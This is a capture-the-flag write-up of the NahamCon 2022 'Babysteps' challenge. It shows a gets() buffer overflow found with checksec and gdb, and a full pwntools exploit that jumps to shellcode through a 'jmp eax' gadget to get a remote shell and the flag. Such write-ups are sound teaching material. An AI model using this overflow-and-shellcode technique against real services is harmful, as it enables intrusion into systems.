# Babysteps - NahamCon CTF 2022 -
[https://www.nahamcon.com/](https://www.nahamcon.com/)  
Binary Exploitation, 385 Points

## Description

![Info.JPG](images/info.JPG)  
  
## Babysteps Solution

Let's run ```checksec``` on the attached file [babysteps](./Babysteps):  
```console  
┌─[evyatar@parrot]─[/nahamcon/binary_exploitation/babysteps]  
└──╼ $ checksec Babysteps  
[*] '/nahamcon/binary_exploitation/Babysteps'  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x8048000)  
   RWX:      Has RWX segments  
```

As we can see we have [NX disabled](https://ctf101.org/binary-exploitation/no-
execute/), [No Stack Canary](https://ctf101.org/binary-exploitation/stack-
canaries/).

Let's run the binary:  
```console  
┌─[evyatar@parrot]─[/nahamcon/binary_exploitation/babysteps]  
└──╼ $ ./babysteps  
             _)_  
          .-'(/ '-.  
         /    `    \  
        /  -     -  \  
       (`  a     a  `)  
        \     ^     /  
         '. '---' .'  
         .-`'---'`-.  
        /           \  
       /  / '   ' \  \  
     _/  /|       |\  \_  
    `/|\` |+++++++|`/|\`  
         /\       /\  
         | `-._.-` |  
         \   / \   /  
         |_ |   | _|  
         | _|   |_ |  
         (ooO   Ooo)

=== BABY SIMULATOR 9000 ===  
How's it going, babies!!  
Are you ready for the adventure of a lifetime? (literally?)

First, what is your baby name?  
evyatar  
Pefect! Now let's get to being a baby!

CHOOSE A BABY ACTIVITY  
a. Whine  
b. Cry  
c. Scream  
d. Throw a temper tantrum  
e. Sleep.  
```

By observing the attached source code [./babysteps.c](./babysteps.c) we can
see the follow:  
```c  
void ask_baby_name() {  
 char buffer[BABYBUFFER];  
 puts("First, what is your baby name?");  
 return gets(buffer);  
}

int main(int argc, char **argv){  
 ...  
 puts("How's it going, babies!!");  
 puts("Are you ready for the adventure of a lifetime? (literally?)");  
 puts("");  
 ask_baby_name();  
 ...  
}  
```

We can see classic buffer overflow on ```ask_baby_name``` function.

Let's find the offset between the ```buffer``` to ```EIP``` using ```gdb```:  
```asm  
┌─[evyatar@parrot]─[/nahamcon/binary_exploitation/babysteps]  
└──╼ $ gdb babysteps  
gef➤  disassemble ask_baby_name  
Dump of assembler code for function ask_baby_name:  
  0x08049299 <+0>:      push   ebp  
  0x0804929a <+1>:      mov    ebp,esp  
  0x0804929c <+3>:      push   ebx  
  0x0804929d <+4>:      sub    esp,0x14  
  0x080492a0 <+7>:      call   0x80490e0 <__x86.get_pc_thunk.bx>  
  0x080492a5 <+12>:     add    ebx,0x2d5b  
  0x080492ab <+18>:     sub    esp,0xc  
  0x080492ae <+21>:     lea    eax,[ebx-0x1f40]  
  0x080492b4 <+27>:     push   eax  
  0x080492b5 <+28>:     call   0x8049050 <puts@plt>  
  0x080492ba <+33>:     add    esp,0x10  
  0x080492bd <+36>:     sub    esp,0xc  
  0x080492c0 <+39>:     lea    eax,[ebp-0x18]  
  0x080492c3 <+42>:     push   eax  
  0x080492c4 <+43>:     call   0x8049040 <gets@plt>  
  0x080492c9 <+48>:     add    esp,0x10  
  0x080492cc <+51>:     mov    ebx,DWORD PTR [ebp-0x4]  
  0x080492cf <+54>:     leave  
  0x080492d0 <+55>:     ret  
End of assembler dump.  
```

Let's add a breakepoint right after the ```gets``` function:  
```asm  
gef➤  b *ask_baby_name+48  
Breakpoint 1 at 0x80492c9  
```

Run and search for the input pattern:  
```asm  
gef➤  r  
Starting program: /nahamcon/binary_exploitation/babysteps/babysteps  
             _)_  
          .-'(/ '-.  
         /    `    \  
        /  -     -  \  
       (`  a     a  `)  
        \     ^     /  
         '. '---' .'  
         .-`'---'`-.  
        /           \  
       /  / '   ' \  \  
     _/  /|       |\  \_  
    `/|\` |+++++++|`/|\`  
         /\       /\  
         | `-._.-` |  
         \   / \   /  
         |_ |   | _|  
         | _|   |_ |  
         (ooO   Ooo)

=== BABY SIMULATOR 9000 ===  
How's it going, babies!!  
Are you ready for the adventure of a lifetime? (literally?)

First, what is your baby name?  
evyatar

Breakpoint 1, 0x080492c9 in ask_baby_name ()

[ Legend: Modified register | Code | Heap | Stack | String ]  
─────────────────────────────────────────────────────────────────────────────
registers ────  
$eax   : 0xffffd070  →  "evyatar"  
$ebx   : 0x0804c000  →  0x0804bf0c  →  <_DYNAMIC+0> add DWORD PTR [eax], eax  
$ecx   : 0xf7fa5580  →  0xfbad208b  
$edx   : 0xfbad208b  
$esp   : 0xffffd060  →  0xffffd070  →  "evyatar"  
$ebp   : 0xffffd088  →  0xffffd0a8  →  0x00000000  
$esi   : 0xf7fa5000  →  0x001e4d6c  
$edi   : 0xf7fa5000  →  0x001e4d6c  
$eip   : 0x080492c9  →  <ask_baby_name+48> add esp, 0x10  
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow
resume virtualx86 identification]  
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063  
─────────────────────────────────────────────────────────────────────────────────
stack ────  
0xffffd060│+0x0000: 0xffffd070  →  "evyatar"     ← $esp  
0xffffd064│+0x0004: 0xf7fe88f0  →   pop edx  
0xffffd068│+0x0008: 0xfbad208b  
0xffffd06c│+0x000c: 0x080492a5  →  <ask_baby_name+12> add ebx, 0x2d5b  
0xffffd070│+0x0010: "evyatar"  
0xffffd074│+0x0014: 0x00726174 ("tar"?)  
0xffffd078│+0x0018: 0xffffd0a8  →  0x00000000  
0xffffd07c│+0x001c: 0x0804948e  →  <main+445> add esp, 0x10  
───────────────────────────────────────────────────────────────────────────
code:x86:32 ────  
   0x80492c0 <ask_baby_name+39> lea    eax, [ebp-0x18]  
   0x80492c3 <ask_baby_name+42> push   eax  
   0x80492c4 <ask_baby_name+43> call   0x8049040 <gets@plt>  
→  0x80492c9 <ask_baby_name+48> add    esp, 0x10  
   0x80492cc <ask_baby_name+51> mov    ebx, DWORD PTR [ebp-0x4]  
   0x80492cf <ask_baby_name+54> leave  
   0x80492d0 <ask_baby_name+55> ret  
   0x80492d1 <main+0>         lea    ecx, [esp+0x4]  
   0x80492d5 <main+4>         and    esp, 0xfffffff0  
───────────────────────────────────────────────────────────────────────────────
threads ────  
[#0] Id 1, Name: "babysteps", stopped 0x80492c9 in ask_baby_name (), reason:
BREAKPOINT  
─────────────────────────────────────────────────────────────────────────────────
trace ────  
[#0] 0x80492c9 → ask_baby_name()  
[#1] 0x8049496 → main()  
────────────────────────────────────────────────────────────────────────────────────────────  
gef➤  search-pattern evyatar  
[+] Searching 'evyatar' in memory  
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rwx  
 0xffffd070 - 0xffffd077  →   "evyatar"  
gef➤  info frame  
Stack level 0, frame at 0xffffd090:  
eip = 0x80492c9 in ask_baby_name; saved eip = 0x8049496  
called by frame at 0xffffd0c0  
Arglist at 0xffffd088, args:  
Locals at 0xffffd088, Previous frame's sp is 0xffffd090  
Saved registers:  
 ebx at 0xffffd084, ebp at 0xffffd088, eip at 0xffffd08c  
```

Before we calculate the offset between the ```buffer``` to ```eip``` we can
see that our input stored on ```EAX```:  
```asm  
$eax   : 0xffffd070  →  "evyatar"  
```

It's can help us to build the payload.

So the buffer locates on ```0xffffd070``` and ```EIP``` on ```0xffffd08c``` so
the offset is ```28``` bytes:  
```console  
... |   buffer[BUFFER_SIZE]   | 12 bytes  | EIP | ...  
```

So because we know the buffer on ```eax``` we can put ```NOP*28``` and put our
shellcode after the ```EIP``` and set to ```EIP``` gadget of ```jmp eax```:  
```console  
... | /x90 * 28 (Address in EAX)  |  gadget on "jmp eax" (EIP) | ....  
```

Let's find the relevant gadget:  
```console  
┌─[evyatar@parrot]─[/nahamcon/binary_exploitation/babysteps]  
└──╼ $ ROPgadget --binary babysteps | grep "jmp eax"  
0x08049543 : add eax, ebx ; jmp eax  
0x08049545 : jmp eax  
0x0804953c : mov eax, dword ptr [eax + ebx - 0x1c78] ; add eax, ebx ; jmp eax  
```

The relevant gadget is ```0x08049545 : jmp eax```.

Let's solve it using
[pwntools](https://docs.pwntools.com/en/stable/intro.html) with the following
[code](./exp_babysteps.py):  
```python  
from pwn import *

elf = ELF('./babysteps')  
libc = elf.libc

if args.REMOTE:  
   p = remote('challenge.nahamcon.com', 31879)  
else:  
   p = process(elf.path)

# payload buffer  
payload = b"\x90"*28  
payload += p32(0x8049545)  
payload += asm(shellcraft.sh())  
payload += asm(shellcraft.exit())

p.recvuntil('?')  
p.sendline(payload)  
p.interactive()  
```

Run it:  
```python  
┌─[evyatar@parrot]─[/nahamcon/binary_exploitation/babysteps]  
└──╼ $ python3 exp_babysteps.py REMOTE  
[*] '/nahamcon/binary_exploitation/babysteps/babysteps'  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x8048000)  
   RWX:      Has RWX segments  
[*] '/usr/lib32/libc-2.31.so'  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to challenge.nahamcon.com on port 31879: Done  
[*] Switching to interactive mode  
(literally?)

First, what is your baby name?  
$ hostname  
babysteps-cff24dc585091927-688f7f999b-4bfwf  
$ ls  
babysteps  
bin  
dev  
etc  
flag.txt  
lib  
lib32  
lib64  
libx32  
usr  
$ cat flag.txt  
flag{7d4ce4594f7511f8d7d6d0b1edd1a162}  
```

And we get the flag ```flag{7d4ce4594f7511f8d7d6d0b1edd1a162}```.

Original writeup
(https://github.com/evyatar9/Writeups/tree/master/CTFs/2022-NahamCon_CTF/Binary_Exploitation/Babysteps).